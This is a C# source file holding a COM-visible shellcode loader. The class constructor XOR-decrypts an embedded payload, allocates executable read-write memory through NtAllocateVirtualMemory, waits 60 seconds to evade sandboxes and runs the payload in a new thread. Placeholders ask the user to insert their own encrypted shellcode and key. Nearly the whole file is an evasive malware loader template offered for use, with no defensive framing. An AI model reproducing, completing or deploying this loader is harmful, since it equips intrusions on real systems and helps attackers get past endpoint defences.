using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

[ComVisible(true)]
public class TestClass
{
    // Constants for memory allocation and protection
    private const int MEM_COMMIT = 0x00001000;
    private const int PAGE_EXECUTE_READWRITE = 0x40;

    public TestClass()
    {
        ExecuteShellcode();
    }

    private void ExecuteShellcode()
    {
        // Encrypted shellcode
        byte[] encryptedShellcode = {/* Add Shellcode Here */ }; // Replace with your encrypted shellcode

        // XOR decryption key
        byte key = /* Add decryption key here */; // XOR decryption key

        // Decrypt the shellcode
        XorDecrypt(encryptedShellcode, key);

        // Allocate memory with READWRITE permission
        IntPtr addr = Allocate(encryptedShellcode.Length);

        // Copy the decrypted shellcode into the allocated memory
        Marshal.Copy(encryptedShellcode, 0, addr, encryptedShellcode.Length);

        // Wait for 60 seconds before executing the shellcode - change this to as long as you want
        Thread.Sleep(60000);

        // Execute the shellcode
        IntPtr processHandle = Process.GetCurrentProcess().Handle;
        IntPtr threadHandle = IntPtr.Zero;
        IntPtr startAddress = addr;
        IntPtr parameter = IntPtr.Zero;
        uint creationFlags = 0;
        uint threadId;

        threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, 0, startAddress, parameter, creationFlags, out threadId);

        if (threadHandle != IntPtr.Zero)
        {
            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
            CloseHandle(threadHandle);
        }
    }

    private void XorDecrypt(byte[] shellcode, byte key)
    {
        for (int i = 0; i < shellcode.Length; i++)
        {
            shellcode[i] ^= key;
        }
    }

    private IntPtr Allocate(int size)
    {
        IntPtr addr = IntPtr.Zero;
        IntPtr sizeIntPtr = new IntPtr(size);

        int result = NtAllocateVirtualMemory(Process.GetCurrentProcess().Handle, ref addr, IntPtr.Zero, ref sizeIntPtr, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (result != 0)
        {
            throw new Exception($"Failed to allocate memory: {result}");
        }

        return addr;
    }

    [DllImport("ntdll.dll")]
    private static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, int AllocationType, int Protect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);
}
